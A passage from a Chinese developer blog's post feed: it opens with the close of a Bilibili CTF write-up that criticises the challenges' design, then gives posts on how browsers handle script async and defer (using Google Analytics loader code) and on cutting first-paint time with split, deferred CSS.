不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\"> <div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-25</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\"> <div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-13</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 